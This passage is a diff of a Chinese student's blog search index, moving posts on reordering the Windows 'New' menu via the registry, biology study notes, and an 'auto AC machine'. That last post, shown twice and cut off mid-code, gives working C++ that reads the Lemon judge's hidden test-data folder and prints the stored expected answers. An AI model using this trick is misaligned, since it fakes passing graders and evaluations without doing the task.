@@ -39,6 +39,66 @@
       </tags>
   </entry>
   <entry>
+    <title>重新排列 Windows“新建”菜单的顺序</title>
+    <url>/2024/06/20/chong-xin-pai-lie-windowsxin-jian-cai-dan-de-shun-xu/</url>
+    <content><![CDATA[<p>为了方便使用，我的 Windows 电脑进行了许多个性化设置。比如我重新排列了“新建”菜单各个项目的顺序。</p>
+<span id="more"></span>
+<p>如下图：</p>
+<p><img src="/post-images/c511e8ade6ec61131d685d9d9871abcc.png" alt="image-20240620192146449" /></p>
+<p>那么我是如何做到的呢？</p>
+<p></p>
+<hr />
+<h1 id="注册表修改"><a class="markdownIt-Anchor" href="#注册表修改"></a> 注册表修改</h1>
+<p>首先，你需要这样一个注册表地址：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Discardable\PostSetup\ShellNew</span><br></pre></td></tr></table></figure>
+<p>该项下面有一个名为 <code>Classes</code> 的 <code>REG_MULTI_SZ</code> 值。</p>
+<p>我的是这样的，就是现在的新建菜单的顺序，仅供参考：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Folder</span><br><span class="line">.lnk</span><br><span class="line">.bmp</span><br><span class="line">.txt</span><br><span class="line">.md</span><br><span class="line">.bat</span><br><span class="line">.cpp</span><br><span class="line">.py</span><br><span class="line">.html</span><br><span class="line">.docx</span><br><span class="line">.pptx</span><br><span class="line">.xlsx</span><br></pre></td></tr></table></figure>
+<p>你需要做的是修改值，符合你的需求。</p>
+<p><img src="/post-images/57110f74f23bc68d35d0b26135756d2a.png" alt="Clip_2024-06-20_19-30-37" /></p>
+<p>这个错误忽略即可。</p>
+<h1 id="禁用继承"><a class="markdownIt-Anchor" href="#禁用继承"></a> 禁用继承</h1>
+<p>你刚刚做出的修改可能会被系统修改回去。为此需要禁用继承。</p>
+<p><img src="/post-images/ae74466edaf22d1f8ce33e7ce7f56f72.png" alt="Clip_2024-06-20_19-32-29" /></p>
+<p><img src="/post-images/3087b46bb4cd6160ba7aaff423423634.png" alt="Clip_2024-06-20_19-33-25" /></p>
+<p><img src="/post-images/2f0483e6858ae431fa24230e8979c776.png" alt="Clip_2024-06-20_19-33-46" /></p>
+<p><img src="/post-images/a7b351b572c00e2b61a3ae0c4ec6bea2.png" alt="Clip_2024-06-20_19-34-08" /></p>
+<p><img src="/post-images/1e4985e91927831211dd96cc18f986ea.png" alt="Clip_2024-06-20_19-37-07" /></p>
+<p><img src="/post-images/4ff3e255f9719432763b227d9dce61ca.png" alt="Clip_2024-06-20_19-38-21" /></p>
+<p><img src="/post-images/2a64f003e00eb8b10eeecc812ad9e496.png" alt="Clip_2024-06-20_19-39-40" /></p>
+<p><img src="/post-images/ebfa5c60bcf0f1ddaa832c8ff022779c.png" alt="Clip_2024-06-20_19-40-17" /></p>
+<p>分配完成，检查结果。</p>
+<p>完成。</p>
+]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>教程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初中生物重要知识点总结</title>
+    <url>/2024/04/13/chu-zhong-sheng-wu-chong-yao-zhi-shi-dian-zong-jie/</url>
+    <content><![CDATA[<p>初中生物重要知识点总结，仅供复习参考。<br />
+大部分内容来自《万唯中考试题研究》和各种各样的考试，其中一部分是我的错题。</p>
+<span id="more"></span>
+<p><img src="/post-images/001147de777b66f07a51de1c6929d47d.jpg" alt="" /><br />
+<img src="/post-images/d7548989259d796a36c0e60210a48b98.jpg" alt="" /><br />
+<img src="/post-images/60c6fa7e507b1a3dadafed0a70d78f37.jpg" alt="" /><br />
+<img src="/post-images/8f4255e7859fdd2760a9c27b290478d5.jpg" alt="" /><br />
+<img src="/post-images/28b15c21afb917dd5683a3acc4f89920.jpg" alt="" /><br />
+<img src="/post-images/4214d3bab285a07cc49a7b57b61064b0.jpg" alt="" /><br />
+<img src="/post-images/53fa669854d7e92a9d8f961ee33c74b1.jpg" alt="" /></p>
+]]></content>
+      <categories>
+        <category>文化课</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C++ 排序和去重</title>
     <url>/2023/09/15/c-pai-xu-he-qu-chong/</url>
     <content><![CDATA[<p><ul class="markdownIt-TOC">
@@ -123,123 +183,6 @@
       </tags>
   </entry>
   <entry>
-    <title>重新排列 Windows“新建”菜单的顺序</title>
-    <url>/2024/06/20/chong-xin-pai-lie-windowsxin-jian-cai-dan-de-shun-xu/</url>
-    <content><![CDATA[<p>为了方便使用，我的 Windows 电脑进行了许多个性化设置。比如我重新排列了“新建”菜单各个项目的顺序。</p>
-<span id="more"></span>
-<p>如下图：</p>
-<p><img src="/post-images/c511e8ade6ec61131d685d9d9871abcc.png" alt="image-20240620192146449" /></p>
-<p>那么我是如何做到的呢？</p>
-<p></p>
-<hr />
-<h1 id="注册表修改"><a class="markdownIt-Anchor" href="#注册表修改"></a> 注册表修改</h1>
-<p>首先，你需要这样一个注册表地址：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Discardable\PostSetup\ShellNew</span><br></pre></td></tr></table></figure>
-<p>该项下面有一个名为 <code>Classes</code> 的 <code>REG_MULTI_SZ</code> 值。</p>
-<p>我的是这样的，就是现在的新建菜单的顺序，仅供参考：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Folder</span><br><span class="line">.lnk</span><br><span class="line">.bmp</span><br><span class="line">.txt</span><br><span class="line">.md</span><br><span class="line">.bat</span><br><span class="line">.cpp</span><br><span class="line">.py</span><br><span class="line">.html</span><br><span class="line">.docx</span><br><span class="line">.pptx</span><br><span class="line">.xlsx</span><br></pre></td></tr></table></figure>
-<p>你需要做的是修改值，符合你的需求。</p>
-<p><img src="/post-images/57110f74f23bc68d35d0b26135756d2a.png" alt="Clip_2024-06-20_19-30-37" /></p>
-<p>这个错误忽略即可。</p>
-<h1 id="禁用继承"><a class="markdownIt-Anchor" href="#禁用继承"></a> 禁用继承</h1>
-<p>你刚刚做出的修改可能会被系统修改回去。为此需要禁用继承。</p>
-<p><img src="/post-images/ae74466edaf22d1f8ce33e7ce7f56f72.png" alt="Clip_2024-06-20_19-32-29" /></p>
-<p><img src="/post-images/3087b46bb4cd6160ba7aaff423423634.png" alt="Clip_2024-06-20_19-33-25" /></p>
-<p><img src="/post-images/2f0483e6858ae431fa24230e8979c776.png" alt="Clip_2024-06-20_19-33-46" /></p>
-<p><img src="/post-images/a7b351b572c00e2b61a3ae0c4ec6bea2.png" alt="Clip_2024-06-20_19-34-08" /></p>
-<p><img src="/post-images/1e4985e91927831211dd96cc18f986ea.png" alt="Clip_2024-06-20_19-37-07" /></p>
-<p><img src="/post-images/4ff3e255f9719432763b227d9dce61ca.png" alt="Clip_2024-06-20_19-38-21" /></p>
-<p><img src="/post-images/2a64f003e00eb8b10eeecc812ad9e496.png" alt="Clip_2024-06-20_19-39-40" /></p>
-<p><img src="/post-images/ebfa5c60bcf0f1ddaa832c8ff022779c.png" alt="Clip_2024-06-20_19-40-17" /></p>
-<p>分配完成，检查结果。</p>
-<p>完成。</p>
-]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初中生物重要知识点总结</title>
-    <url>/2024/04/13/chu-zhong-sheng-wu-chong-yao-zhi-shi-dian-zong-jie/</url>
-    <content><![CDATA[<p>初中生物重要知识点总结，仅供复习参考。<br />
-大部分内容来自《万唯中考试题研究》和各种各样的考试，其中一部分是我的错题。</p>
-<span id="more"></span>
-<p><img src="/post-images/001147de777b66f07a51de1c6929d47d.jpg" alt="" /><br />
-<img src="/post-images/d7548989259d796a36c0e60210a48b98.jpg" alt="" /><br />
-<img src="/post-images/60c6fa7e507b1a3dadafed0a70d78f37.jpg" alt="" /><br />
-<img src="/post-images/8f4255e7859fdd2760a9c27b290478d5.jpg" alt="" /><br />
-<img src="/post-images/28b15c21afb917dd5683a3acc4f89920.jpg" alt="" /><br />
-<img src="/post-images/4214d3bab285a07cc49a7b57b61064b0.jpg" alt="" /><br />
-<img src="/post-images/53fa669854d7e92a9d8f961ee33c74b1.jpg" alt="" /></p>
-]]></content>
-      <categories>
-        <category>文化课</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>冀少版七年级生物知识点思维导图</title>
-    <url>/2023/07/30/ji-jiao-ban-qi-nian-ji-sheng-wu-zhi-shi-dian-si-wei-dao-tu/</url>
-    <content><![CDATA[<p>仅供参考，对复习可能有一定效果。推荐使用下面的电子课本：</p>
-<ul>
-<li>七年级上册：<a href="https://pandaoxi2020.lanzouj.com/iu0vw1sf9bdi">https://pandaoxi2020.lanzouj.com/iu0vw1sf9bdi</a></li>
-<li>七年级下册：<a href="https://pandaoxi2020.lanzouj.com/iKoAs1sf9bfa">https://pandaoxi2020.lanzouj.com/iKoAs1sf9bfa</a></li>
-</ul>
-<span id="more"></span>
-<p><img src="/post-images/7335015ad50494acc383abac199bad6d.jpg" alt="" /><br />
-<img src="/post-images/2531107e413bdd32271145eda3db4a9b.jpg" alt="" /><br />
-<img src="/post-images/e11f04b7be17ce7681a6940445c23fc2.jpg" alt="" /><br />
-<img src="/post-images/5d8cfd9ff0d9ca51dce02bce1919df1b.jpg" alt="" /><br />
-<img src="/post-images/25da28aef3ce2b636e34c853c80992b8.jpg" alt="" /><br />
-<img src="/post-images/c37892a8b82493b95935ab411ed4796c.jpg" alt="" /><br />
-<img src="/post-images/22464e05cb0be5825772555bb1fb7f7a.jpg" alt="" /><br />
-<img src="/post-images/a1a944b0b7926aa2588e6c34a7ec1eab.jpg" alt="" /><br />
-<img src="/post-images/c83be54fdcacc012069645052dae051f.jpg" alt="" /><br />
-<img src="/post-images/869dc3482a98fcc78b6716e3fcd5d446.jpg" alt="" /><br />
-<img src="/post-images/e6fed35d2591593d7595887fbcbb1899.jpg" alt="" /><br />
-<img src="/post-images/2b13359864ee1481b7bb2cdbae9a480b.jpg" alt="" /></p>
-<p>这其实是我的暑假作业。</p>
-]]></content>
-      <categories>
-        <category>文化课</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基于 Lemon 评测软件的“自动 AC 机”</title>
-    <url>/2023/08/02/ji-yu-lemon-ping-ce-ruan-jian-de-zi-dong-ac-ji/</url>
-    <content><![CDATA[<p>身为一个蒟蒻，想要在模拟赛里面考出一个 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>AK</mtext></mrow><annotation encoding="application/x-tex">\text{AK}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">AK</span></span></span></span></span>（痴心妄想），<s>需要借助科技的力量</s>。<br />
-于是“自动 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>AC</mtext></mrow><annotation encoding="application/x-tex">\text{AC}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">AC</span></span></span></span></span> 机”便应运而生了！</p>
-<span id="more"></span>
-<blockquote>
-<p>前排提示：此文章仅供娱乐，请勿在考试中作弊。否则后果自负。</p>
-<p><strong>好好学习，天天向上。</strong></p>
-</blockquote>
-<hr />
-<blockquote>
-<p>“自动 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>AC</mtext></mrow><annotation encoding="application/x-tex">\text{AC}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">AC</span></span></span></span></span> 机”的原理就类似于一个大型打表器，但表就是数据。根据输入数据到数据文件夹内逐个匹配输入，再根据输入找出对应的输出，实现 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>Accept</mtext></mrow><annotation encoding="application/x-tex">\text{Accept}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord text"><span class="mord">Accept</span></span></span></span></span> 的效果。</p>
-<p>这是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>Lemon</mtext></mrow><annotation encoding="application/x-tex">\text{Lemon}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">Lemon</span></span></span></span></span> 评测的一个 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>BUG</mtext></mrow><annotation encoding="application/x-tex">\text{BUG}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">BUG</span></span></span></span></span>，亲测通过，只是比 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>STD</mtext></mrow><annotation encoding="application/x-tex">\text{STD}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">STD</span></span></span></span></span> 慢了亿点点。对于其他评测软件，作者不保证其准确性。</p>
-<p><img src="/post-images/7ae9215daffdd5a79dd435d6284f7eca.png" alt="" /></p>
-</blockquote>
-<p>刚刚我上网搜了一下，基本都是针对题的。有一个版本是智能版的，但是不完全对。</p>
-<p><a href="https://www.cnblogs.com/oycy0306/p/7620539.html">论自动AC机 - AFOer - 博客园 (cnblogs.com)</a></p>
-<p>那么，就让我来展示一下，我的全自动、傻瓜式、超级智能的“自动 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>AC</mtext></mrow><annotation encoding="application/x-tex">\text{AC}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">AC</span></span></span></span></span> 机”。</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Author:PanDaoxi</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> BUFINF = <span class="number">1e6</span> + <span class="number">1</span>, DFINF = <span class="number">5e2</span> + <span class="number">1</span>;</span><br><span class="line"><span class="type">bool</span> useStdIO, errors;</span><br><span class="line">string errType, dataFile[DFINF];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getData</span><span class="params">(string path)</span></span>;</span><br><span class="line"><span class="function">string <span class="title">getInput</span><span class="params">(string path)</span></span>;</span><br><span class="line"><span class="function">string <span class="title">getExName</span><span class="params">(string s)</span></span>;</span><br><span class="line"><span class="function">string <span class="title">getInputWithoutMoreEndl</span><span class="params">(string path)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checkErr</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">// 请用户填写以下题目信息</span></span><br><span class="line">	useStdIO = <span class="literal">false</span>;					<span class="comment">// 是否使用标准输入输出（true=使用 std，false=使用文件流）</span></span><br><span class="line">	string title = <span class="string">&quot;&lt;title&gt;&quot;</span>,           <span class="comment">// 当前题目名称</span></span><br><span class="line">	iFile = title + <span class="string">&quot;.in&quot;</span>,				<span class="comment">// 题目要求的输入数据文件（仅当 useStdIO 为真时有效）</span></span><br><span class="line">	oFile = title + <span class="string">&quot;.out&quot;</span>,				<span class="comment">// 题目要求的输出数据文件（仅当 useStdIO 为真时有效）</span></span><br><span class="line">	<span class="comment">// 请用户不要操作以下内容</span></span><br><span class="line"></span><br><span class="line">	problemPath = <span class="string">&quot;../../data/&quot;</span> + title + <span class="string">&quot;/&quot;</span>,</span><br><span class="line">	oExName = <span class="built_in">getExName</span>(oFile),</span><br><span class="line">	inp = <span class="string">&quot;&quot;</span>, conStr;</span><br><span class="line">	<span class="keyword">if</span>(useStdIO)&#123;</span><br><span class="line">		string addStr = <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		<span class="meta">#<span class="keyword">ifdef</span> _WIN32</span></span><br><span class="line">		    addStr = <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">		<span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">while</span>(<span class="built_in">getline</span>(cin, conStr)) inp += conStr + addStr;</span><br><span class="line">		inp = inp.<span class="built_in">substr</span>(<span class="number">0</span>, inp.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		inp = <span class="built_in">getInputWithoutMoreEndl</span>(iFile);</span><br><span class="line">		<span class="built_in">freopen</span>(oFile.<span class="built_in">c_str</span>(), <span class="string">&quot;wb&quot;</span>, stdout);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> dataFileCNT = <span class="built_in">getData</span>(problemPath);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=dataFileCNT; i++)&#123;</span><br><span class="line">		string exName = <span class="built_in">getExName</span>(dataFile[i]);</span><br><span class="line">        <span class="keyword">if</span>(exName != <span class="string">&quot;.in&quot;</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">			string absPath = problemPath + dataFile[i],</span><br><span class="line">			curIn = <span class="built_in">getInputWithoutMoreEndl</span>(absPath);</span><br><span class="line">			<span class="keyword">if</span>(curIn == inp)&#123;</span><br><span class="line">				<span class="type">int</span> pointPOS = dataFile[i].<span class="built_in">find</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">				string ansPath = problemPath + dataFile[i].<span class="built_in">substr</span>(<span class="number">0</span>, pointPOS) + oExName,</span><br><span class="line">				ans = <span class="built_in">getInput</span>(ansPath);</span><br><span class="line">				cout &lt;&lt; ans;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Could not find the answer&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getData</span><span class="params">(string path)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> dataFileCNT = <span class="number">0</span>;</span><br><span class="line">	DIR *dirPath = <span class="built_in">opendir</span>(path.<span class="built_in">c_str</span>());</span><br><span class="line">    <span class="keyword">if</span>(!dirPath)&#123;</span><br><span class="line">    	errors = <span class="literal">true</span>;</span><br><span class="line">    	errType = <span class="string">&quot;Could not reach the folder&quot;</span>;</span><br><span class="line">        <span class="built_in">checkErr</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    dirent *dName;</span><br><span class="line">    <span class="keyword">while</span>((dName = <span class="built_in">readdir</span>(dirPath)))&#123;</span><br><span class="line">        dataFile[++dataFileCNT] = dName -&gt; d_name;</span><br><span class="line">        <span class="keyword">if</span>(dataFile[dataFileCNT] == <span class="string">&quot;.&quot;</span> || dataFile[dataFileCNT] == <span class="string">&quot;..&quot;</span>) dataFileCNT--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">closedir</span>(dirPath);</span><br><span class="line">    <span class="keyword">return</span> dataFileCNT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">getInput</span><span class="params">(string path)</span></span>&#123;</span><br><span class="line">	FILE *fp = <span class="built_in">fopen</span>(path.<span class="built_in">c_str</span>(), <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!fp)&#123;</span><br><span class="line">		errors = <span class="literal">true</span>;</span><br><span class="line">		errType = <span class="string">&quot;Could not read from the INPUT file&quot;</span>;</span><br><span class="line">		<span class="built_in">checkErr</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span> buffer[BUFINF] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">while</span>(!<span class="built_in">feof</span>(fp))&#123;</span><br><span class="line">		<span class="built_in">fread</span>(buffer, <span class="built_in">sizeof</span>(buffer), <span class="number">1</span>, fp);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">feof</span>(fp)) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">string</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">getInputWithoutMoreEndl</span><span class="params">(string path)</span></span>&#123;</span><br><span class="line">	string tmp = <span class="built_in">getInput</span>(path);</span><br><span class="line">	<span class="type">int</span> bufferLen = tmp.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>(tmp[bufferLen] == <span class="string">&#x27;\n&#x27;</span>) tmp = tmp.<span class="built_in">substr</span>(<span class="number">0</span>, bufferLen--);</span><br><span class="line">	<span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">getExName</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> tmp = s.<span class="built_in">find</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> s.<span class="built_in">substr</span>(tmp == <span class="number">-1</span> ? <span class="number">0</span> : tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checkErr</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(errors)&#123;</span><br><span class="line">		cerr &lt;&lt; errType;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>OI 系列</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>解决一部分 Windows 下 U 盘插入无反应的问题</title>
     <url>/2023/11/19/jie-jue-yi-bu-fen-windows-xia-u-pan-cha-ru-wu-fan-ying-de-wen-ti/</url>
     <content><![CDATA[<p>本文适用情况：</p>
@@ -299,6 +242,63 @@
       </categories>
       <tags>
         <tag>诗词</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>冀少版七年级生物知识点思维导图</title>
+    <url>/2023/07/30/ji-jiao-ban-qi-nian-ji-sheng-wu-zhi-shi-dian-si-wei-dao-tu/</url>
+    <content><![CDATA[<p>仅供参考，对复习可能有一定效果。推荐使用下面的电子课本：</p>
+<ul>
+<li>七年级上册：<a href="https://pandaoxi2020.lanzouj.com/iu0vw1sf9bdi">https://pandaoxi2020.lanzouj.com/iu0vw1sf9bdi</a></li>
+<li>七年级下册：<a href="https://pandaoxi2020.lanzouj.com/iKoAs1sf9bfa">https://pandaoxi2020.lanzouj.com/iKoAs1sf9bfa</a></li>
+</ul>
+<span id="more"></span>
+<p><img src="/post-images/7335015ad50494acc383abac199bad6d.jpg" alt="" /><br />
+<img src="/post-images/2531107e413bdd32271145eda3db4a9b.jpg" alt="" /><br />
+<img src="/post-images/e11f04b7be17ce7681a6940445c23fc2.jpg" alt="" /><br />
+<img src="/post-images/5d8cfd9ff0d9ca51dce02bce1919df1b.jpg" alt="" /><br />
+<img src="/post-images/25da28aef3ce2b636e34c853c80992b8.jpg" alt="" /><br />
+<img src="/post-images/c37892a8b82493b95935ab411ed4796c.jpg" alt="" /><br />
+<img src="/post-images/22464e05cb0be5825772555bb1fb7f7a.jpg" alt="" /><br />
+<img src="/post-images/a1a944b0b7926aa2588e6c34a7ec1eab.jpg" alt="" /><br />
+<img src="/post-images/c83be54fdcacc012069645052dae051f.jpg" alt="" /><br />
+<img src="/post-images/869dc3482a98fcc78b6716e3fcd5d446.jpg" alt="" /><br />
+<img src="/post-images/e6fed35d2591593d7595887fbcbb1899.jpg" alt="" /><br />
+<img src="/post-images/2b13359864ee1481b7bb2cdbae9a480b.jpg" alt="" /></p>
+<p>这其实是我的暑假作业。</p>
+]]></content>
+      <categories>
+        <category>文化课</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基于 Lemon 评测软件的“自动 AC 机”</title>
+    <url>/2023/08/02/ji-yu-lemon-ping-ce-ruan-jian-de-zi-dong-ac-ji/</url>
+    <content><![CDATA[<p>身为一个蒟蒻，想要在模拟赛里面考出一个 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>AK</mtext></mrow><annotation encoding="application/x-tex">\text{AK}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">AK</span></span></span></span></span>（痴心妄想），<s>需要借助科技的力量</s>。<br />
+于是“自动 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>AC</mtext></mrow><annotation encoding="application/x-tex">\text{AC}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">AC</span></span></span></span></span> 机”便应运而生了！</p>
+<span id="more"></span>
+<blockquote>
+<p>前排提示：此文章仅供娱乐，请勿在考试中作弊。否则后果自负。</p>
+<p><strong>好好学习，天天向上。</strong></p>
+</blockquote>
+<hr />
+<blockquote>
+<p>“自动 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>AC</mtext></mrow><annotation encoding="application/x-tex">\text{AC}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">AC</span></span></span></span></span> 机”的原理就类似于一个大型打表器，但表就是数据。根据输入数据到数据文件夹内逐个匹配输入，再根据输入找出对应的输出，实现 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>Accept</mtext></mrow><annotation encoding="application/x-tex">\text{Accept}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord text"><span class="mord">Accept</span></span></span></span></span> 的效果。</p>
+<p>这是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>Lemon</mtext></mrow><annotation encoding="application/x-tex">\text{Lemon}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">Lemon</span></span></span></span></span> 评测的一个 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>BUG</mtext></mrow><annotation encoding="application/x-tex">\text{BUG}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">BUG</span></span></span></span></span>，亲测通过，只是比 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>STD</mtext></mrow><annotation encoding="application/x-tex">\text{STD}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">STD</span></span></span></span></span> 慢了亿点点。对于其他评测软件，作者不保证其准确性。</p>
+<p><img src="/post-images/7ae9215daffdd5a79dd435d6284f7eca.png" alt="" /></p>
+</blockquote>
+<p>刚刚我上网搜了一下，基本都是针对题的。有一个版本是智能版的，但是不完全对。</p>
+<p><a href="https://www.cnblogs.com/oycy0306/p/7620539.html">论自动AC机 - AFOer - 博客园 (cnblogs.com)</a></p>
+<p>那么，就让我来展示一下，我的全自动、傻瓜式、超级智能的“自动 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>AC</mtext></mrow><annotation encoding="application/x-tex">\text{AC}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord">AC</span></span></span></span></span> 机”。</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Author:PanDaoxi</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> BUFINF = <span class="number">1e6</span> + <span class="number">1</span>, DFINF = <span class="number">5e2</span> + <span class="number">1</span>;</span><br><span class="line"><span class="type">bool</span> useStdIO, errors;</span><br><span class="line">string errType, dataFile[DFINF];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getData</span><span class="params">(string path)</span></span>;</span><br><span class="line"><span class="function">string <span class="title">getInput</span><span class="params">(string path)</span></span>;</span><br><span class="line"><span class="function">string <span class="title">getExName</span><span class="params">(string 